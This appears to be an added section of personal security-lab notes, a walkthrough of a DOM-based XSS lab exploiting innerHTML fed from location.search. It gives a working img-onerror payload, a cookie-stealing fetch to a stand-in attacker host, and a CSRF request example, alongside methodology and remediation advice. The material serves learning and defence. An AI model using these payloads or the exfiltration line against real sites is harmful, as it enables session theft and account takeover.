@@ -1781,3 +1781,448 @@ If your payload is trapped inside a tag → break the structure first
 → Can I break out of that structure?  
 
 ---
+
+# Lab-5 🐞 DOM-Based XSS via innerHTML + location.search inside span tag
+
+---
+
+## 🔹 Overview
+
+DOM-Based Cross-Site Scripting (DOM XSS) happens when:
+
+1️⃣ User input enters through the URL  
+2️⃣ JavaScript reads that input  
+3️⃣ It inserts the input into the page using a dangerous function  
+4️⃣ The browser parses it as HTML and executes it  
+
+---
+
+### ⚠ Important in this lab
+
+- Vulnerability exists in JavaScript (client-side)  
+- Server response may be completely safe  
+- Execution happens when DOM is updated using innerHTML  
+
+---
+
+### 🔄 Flow
+
+User Input  
+→ location.search  
+→ innerHTML  
+→ DOM  
+→ Browser parses  
+→ Event executes  
+
+---
+
+## 🔹 What Is This Topic?
+
+This lab demonstrates DOM XSS using:
+```
+element.innerHTML = location.search
+```
+---
+
+### 🧠 Source
+
+location.search  
+
+👉 Reads user-controlled data from URL:
+```
+?search=INPUT
+```
+---
+
+### 🧠 Sink
+
+innerHTML  
+
+👉 Inserts data directly into DOM as HTML (unsafe)
+
+---
+
+### ⚠ Important Behavior
+```
+<script>
+```
+- Does NOT execute inside innerHTML  
+
+Event handlers DO execute:
+
+- onerror  
+- onload  
+
+---
+
+## 🔹 Lab Walkthrough
+
+---
+
+### Step 1 — Open the Lab
+
+Go to blog search functionality  
+
+---
+
+### Step 2 — Test Input Reflection
+
+Input:
+
+XSS123  
+
+---
+
+### Step 3 — Inspect Live DOM
+
+Use DevTools → Inspector (NOT view-source)
+
+Found:
+```
+<span id="searchMessage">XSS123</span>
+```
+---
+
+### Step 4 — Identify Context
+
+👉 Input is inside:
+```
+<span>INPUT</span>
+```
+✔ HTML text context  
+✔ Not attribute  
+✔ Not JavaScript  
+
+---
+
+### Step 5 — Try Basic Payload
+```
+<script>alert(1)</script>
+```
+❌ Does NOT execute  
+
+---
+
+### Step 6 — Understand Why
+
+Browser parses script tag  
+
+But blocks execution when inserted via innerHTML  
+
+---
+
+### Step 7 — Craft Working Payload
+
+🎯 Use event-based execution  
+
+---
+
+### ✅ Final Payload
+```
+<img src=x onerror=alert(1)>
+```
+---
+
+### Step 8 — Browser Parsing
+
+---
+
+Before:
+```
+<span id="searchMessage">XSS123</span>
+```
+---
+
+After:
+```
+<span id="searchMessage">
+<img src=x onerror=alert(1)>
+</span>
+```
+---
+
+### Step 9 — Execution
+
+1️⃣ Browser loads image  
+2️⃣ src=x fails  
+3️⃣ onerror triggers  
+4️⃣ JavaScript executes  
+
+💥 Alert appears  
+
+---
+
+### ✅ Lab solved
+
+---
+
+### ✔ Exact Payload Used
+```
+<img src=x onerror=alert(1)>
+```
+---
+
+### ✔ Where Input Goes
+
+URL → search parameter  
+
+---
+
+### ✔ Source → Sink → Execution Flow
+
+location.search  
+→ innerHTML  
+→ DOM insertion  
+→ browser parses  
+→ image fails  
+→ onerror executes  
+
+---
+
+### ✔ What Changed in DOM
+
+---
+
+Before:
+```
+<span id="searchMessage">XSS123</span>
+```
+---
+
+After:
+```
+<span id="searchMessage">
+<img src=x onerror=alert(1)>
+</span>
+```
+---
+
+## 🔹 Evidence / Screenshot (SS)
+
+![DOM innerHTML injection execution](../images/dom-xss-innerhtml-eventbased-execution.png)
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🟢 1️⃣ innerHTML Injection (Most Common)
+```
+element.innerHTML = userInput
+```
+Payload:
+```
+<img src=x onerror=alert(1)>
+```
+📌 Seen in:
+
+- Search pages  
+- Filters  
+- Dashboards  
+- Comments preview  
+
+---
+
+### 🟢 2️⃣ Dynamic UI Rendering
+```
+div.innerHTML = "Result: " + input
+```
+---
+
+### 🟢 3️⃣ Error Messages / Notifications
+```
+msg.innerHTML = error
+```
+---
+
+### 🟢 4️⃣ Third-Party Data Rendering
+```
+widget.innerHTML = apiResponse
+```
+---
+
+### 🟢 5️⃣ Admin Panels
+
+User input stored → rendered using innerHTML  
+
+---
+
+## 🎯 High-Value Targets
+
+- Search functionality  
+- Filters  
+- URL parameters  
+- Admin dashboards  
+- Analytics panels  
+- Notification systems  
+- Preview features  
+
+---
+
+## 🔗 Attack Chains
+
+---
+
+### 🔥 Session Hijacking
+```
+fetch("https://attacker.com?cookie="+document.cookie)
+```
+---
+
+### 🔥 Account Takeover
+
+Steal:
+
+- session cookies  
+- tokens  
+
+---
+
+### 🔥 Admin Compromise
+
+Admin loads page → payload executes  
+
+---
+
+### 🔥 Data Exfiltration
+
+Read:
+
+- DOM data  
+- API responses  
+
+---
+
+### 🔥 CSRF Automation
+```
+fetch("/change-password",{method:"POST"})
+```
+---
+
+## 🧪 Methodology
+
+---
+
+### Step 1
+
+Insert test string  
+
+---
+
+### Step 2
+
+Find reflection in DOM  
+
+---
+
+### Step 3
+
+Identify context  
+
+---
+
+### Step 4
+
+Identify source (location.search)  
+
+---
+
+### Step 5
+
+Identify sink (innerHTML)  
+
+---
+
+### Step 6
+
+Test script payload (fails)  
+
+---
+
+### Step 7
+
+Use event-based payload  
+
+---
+
+### Step 8
+
+Confirm execution  
+
+---
+
+## ⚠ Why This Lab Is Special
+```
+<script>
+```
+- Does NOT work  
+
+- Requires event-based payloads  
+- Happens only in browser  
+- Easily missed  
+
+---
+
+## 🛡 Remediation
+
+- Avoid innerHTML with untrusted input  
+- Use textContent instead  
+- Sanitize input properly  
+- Use frameworks with auto-escaping  
+- Implement CSP  
+
+---
+
+## 💡 Notes / Mindset
+
+DOM XSS is about tracking data flow inside JavaScript, not just testing inputs  
+
+---
+
+## 🧠 Mental Model
+
+Find source  
+→ Identify sink  
+→ Check context  
+→ Test payload  
+→ Adjust  
+→ Execute  
+
+---
+
+## 💡 Key Difference
+
+Reflected XSS → server execution  
+
+Stored XSS → persistent  
+
+DOM XSS → browser execution  
+
+---
+
+## 💡 One-Line Memory Hook
+
+If script fails → use event-based payload  
+
+---
+
+## 🧠 Bug Hunter Mindset
+
+→ Where does input enter JavaScript?  
+→ Is innerHTML used?  
+→ What context is output in?  
+→ Does script work or not?  
+→ Should I use event payload?  
+
+---
+
+## 💡 Extra Tips
+
+- Always check live DOM (Inspector)  
+- Don’t rely on script payload blindly  
+- Use img onerror as default payload  
+- Browser may fix broken HTML  
+- Focus on execution, not clean structure  
+
+---
